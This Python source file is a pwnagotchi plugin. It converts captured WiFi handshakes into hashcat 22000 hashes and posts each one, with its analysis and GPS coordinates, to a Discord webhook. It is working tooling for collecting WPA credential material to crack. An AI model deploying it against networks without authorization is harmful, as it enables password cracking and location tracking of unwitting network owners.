"""
discohash_ng.py - pwnagotchi plugin (runs ON the pi)

Rewrite of the original DiscoHash plugin (flamebarke/v0yager), fixed for
the jayofelony 64-bit fork on a Pi 4 + 3.5" TFT.

What it does:
  - Watches for new handshakes (live, via on_handshake) and also sweeps
    the handshake folder once per epoch to catch anything captured while
    offline.
  - Converts each new handshake to a hashcat 22000 hash with
    hcxpcapngtool, analyzes it with hcxhashtool, and posts the result
    (plus GPS coordinates if available) to a Discord webhook.
  - Never posts the same handshake twice, even across restarts.
  - Only retries a Discord post if it actually fails - a successful post
    does not retry.

Bugs fixed vs. the original DiscoHash:
  1. Filtered for ".pcap" - this fork only ever writes ".pcapng", so the
     original found nothing, ever. Fixed to filter/strip ".pcapng".
  2. Hardcoded handshake directory was "/root/handshakes/" - this fork's
     real default is "/etc/pwnagotchi/handshakes". Now a config option
     (see config.toml.example), defaulting to the real path.
  3. Used bare module-level globals (tether, fingerprint, lat, lon,
     loc_url) instead of instance state - replaced with plain instance
     attributes and local variables.
  4. No duplicate-post protection - would re-post the same hash forever
     on every epoch/restart. Now tracked in a small local state file.
  5. No config validation - reading self.options['webhook_url'] directly
     would KeyError. Now uses self.options.get(...) everywhere per this
     fork's own plugin-loader behavior (class-level __defaults__ is never
     read on this build - every option must be set in config.toml).

See ../SETUP.md for the full setup walkthrough and config.toml.example
in this folder for exactly what to add to your config.toml.
"""

import json
import logging
import os
import subprocess
import time

import requests

import pwnagotchi
import pwnagotchi.plugins as plugins


class DiscoHashNG(plugins.Plugin):
    __author__ = "v0yager (original DiscoHash); rewritten for jayofelony fork"
    __version__ = "2.0.0"
    __license__ = "GPL3"
    __description__ = (
        "Converts captured handshakes to hashcat 22000 hashes, analyzes "
        "them, and posts new hashes (with GPS if available) to a Discord "
        "webhook. Never posts the same handshake twice; only retries a "
        "post if it actually fails."
    )
    __name__ = "DiscoHashNG"
    __help__ = __description__
    __dependencies__ = {
        "apt": ["hcxtools"],
        "pip": ["requests"],
    }
    # NOTE: this fork's plugin loader does NOT read __defaults__ at all
    # (confirmed directly from pwnagotchi/plugins/__init__.py - it assigns
    # self.options straight from your config.toml, nothing else). This
    # block is documentation only. Set every one of these explicitly in
    # config.toml - see config.toml.example in this folder.
    __defaults__ = {
        "enabled": False,
        "webhook_url": None,
        "handshake_dir": "/etc/pwnagotchi/handshakes",
        "state_file": "/etc/pwnagotchi/discohash_ng.posted.json",
        "retry_attempts": 3,
        "retry_delay": 5,
    }

    def __init__(self):
        self.ready = False
        self.internet = False
        self.posted = set()

    # ---------------------------------------------------------------
    # framework hooks
    # ---------------------------------------------------------------

    def on_loaded(self):
        if not self.options.get("webhook_url"):
            logging.error(
                f"[{self.__class__.__name__}] 'webhook_url' is not set in "
                f"config.toml - the plugin will run but will not post "
                f"anything until it is."
            )
        self._load_state()
        self.ready = True
        logging.info(f"[{self.__class__.__name__}] plugin loaded")

    def on_internet_available(self, agent):
        self.internet = True

    def on_handshake(self, agent, filename, access_point, client_station):
        if not self.ready:
            return
        self._process_one(filename)

    def on_epoch(self, agent, epoch, epoch_data):
        if not self.ready or not self.internet:
            return
        self._scan_backlog()

    def on_webhook(self, path, request):
        return (
            f"DiscoHashNG is running. "
            f"{len(self.posted)} handshake(s) posted so far this install."
        )

    # ---------------------------------------------------------------
    # state (duplicate-post protection)
    # ---------------------------------------------------------------

    def _state_file(self):
        return self.options.get(
            "state_file", "/etc/pwnagotchi/discohash_ng.posted.json"
        )

    def _load_state(self):
        try:
            with open(self._state_file(), "r") as f:
                self.posted = set(json.load(f))
        except (FileNotFoundError, json.JSONDecodeError):
            self.posted = set()

    def _save_state(self):
        try:
            with open(self._state_file(), "w") as f:
                json.dump(sorted(self.posted), f)
        except Exception as e:
            logging.warning(
                f"[{self.__class__.__name__}] could not save state file: {e}"
            )

    # ---------------------------------------------------------------
    # handshake processing
    # ---------------------------------------------------------------

    def _scan_backlog(self):
        handshake_dir = self.options.get(
            "handshake_dir", "/etc/pwnagotchi/handshakes"
        )
        try:
            filenames = [
                f for f in os.listdir(handshake_dir) if f.endswith(".pcapng")
            ]
        except FileNotFoundError:
            logging.warning(
                f"[{self.__class__.__name__}] handshake_dir not found: "
                f"{handshake_dir}"
            )
            return
        for filename in filenames:
            self._process_one(os.path.join(handshake_dir, filename))

    def _process_one(self, full_path):
        if not full_path.endswith(".pcapng"):
            return
        basename = os.path.basename(full_path)
        if basename in self.posted:
            return

        full_no_ext = full_path[: -len(".pcapng")]
        hash_path = full_no_ext + ".22000"

        if not os.path.isfile(hash_path):
            if not self._write_hash(full_path, hash_path):
                # Not enough packets to build a hash yet (or a transient
                # tool failure) - leave it unmarked so we try again next
                # time this file is seen.
                return

        if not self.options.get("webhook_url"):
            return

        try:
            with open(hash_path, "r") as f:
                hash_data = f.read().strip()
        except Exception as e:
            logging.warning(
                f"[{self.__class__.__name__}] could not read {hash_path}: {e}"
            )
            return

        analysis = self._analyze(hash_path)
        lat, lon, loc_url = self._get_coords(full_no_ext)

        posted_ok = self._post_to_discord(
            basename, hash_data, analysis, lat, lon, loc_url
        )
        if posted_ok:
            self.posted.add(basename)
            self._save_state()

    def _write_hash(self, pcapng_path, hash_path):
        try:
            subprocess.run(
                ["hcxpcapngtool", "-o", hash_path, pcapng_path],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=60,
            )
        except Exception as e:
            logging.warning(
                f"[{self.__class__.__name__}] hcxpcapngtool failed on "
                f"{pcapng_path}: {e}"
            )
            return False
        return os.path.isfile(hash_path)

    def _analyze(self, hash_path):
        try:
            result = subprocess.run(
                ["hcxhashtool", "-i", hash_path, "--info=stdout"],
                stdout=subprocess.PIPE,
                stderr=subprocess.DEVNULL,
                timeout=30,
            )
            return result.stdout.decode("utf-8", errors="replace").strip()
        except Exception as e:
            logging.warning(
                f"[{self.__class__.__name__}] hcxhashtool failed: {e}"
            )
            return "(analysis unavailable)"

    def _get_coords(self, full_no_ext):
        gps_path = full_no_ext + ".gps.json"
        if os.path.isfile(gps_path):
            try:
                with open(gps_path) as f:
                    raw = json.load(f)
                lat = raw["Latitude"]
                lon = raw["Longitude"]
                return (
                    lat,
                    lon,
                    f"https://www.google.com/maps/search/?api=1&query={lat},{lon}",
                )
            except Exception:
                pass

        geo_path = full_no_ext + ".geo.json"
        if os.path.isfile(geo_path):
            try:
                with open(geo_path) as f:
                    raw = json.load(f)
                lat = raw["location"]["lat"]
                lon = raw["location"]["lng"]
                return (
                    lat,
                    lon,
                    f"https://www.google.com/maps/search/?api=1&query={lat},{lon}",
                )
            except Exception:
                pass

        return "N/A", "N/A", None

    # ---------------------------------------------------------------
    # Discord posting - only retries when a post actually fails
    # ---------------------------------------------------------------

    def _post_to_discord(self, basename, hash_data, analysis, lat, lon, loc_url):
        webhook_url = self.options.get("webhook_url")
        attempts = int(self.options.get("retry_attempts", 3))
        delay = int(self.options.get("retry_delay", 5))

        fields = [
            {"name": "File", "value": f"`{basename}`", "inline": False},
            {"name": "Hash", "value": f"```{hash_data[:900]}```", "inline": False},
            {
                "name": "Hash Analysis",
                "value": f"```{analysis[:900]}```",
                "inline": False,
            },
        ]
        if loc_url:
            fields.append(
                {"name": "Location", "value": f"[GPS Waypoint]({loc_url})", "inline": False}
            )
            fields.append(
                {"name": "Raw Coordinates", "value": f"```{lat}, {lon}```", "inline": False}
            )

        payload = {
            "embeds": [
                {
                    "title": f"({pwnagotchi.name()}) sniffed a new hash!",
                    "color": 289968,
                    "description": "__**Hash Information**__",
                    "fields": fields,
                }
            ]
        }

        last_error = None
        for attempt in range(1, attempts + 1):
            try:
                resp = requests.post(webhook_url, json=payload, timeout=15)
                if resp.status_code in (200, 204):
                    logging.info(
                        f"[{self.__class__.__name__}] posted {basename} to Discord"
                    )
                    return True
                last_error = f"HTTP {resp.status_code}: {resp.text[:200]}"
            except Exception as e:
                last_error = str(e)

            # Only reached on failure - a successful post already returned
            # above and never sleeps or loops again.
            if attempt < attempts:
                time.sleep(delay)

        logging.warning(
            f"[{self.__class__.__name__}] failed to post {basename} after "
            f"{attempts} attempt(s): {last_error}"
        )
        return False
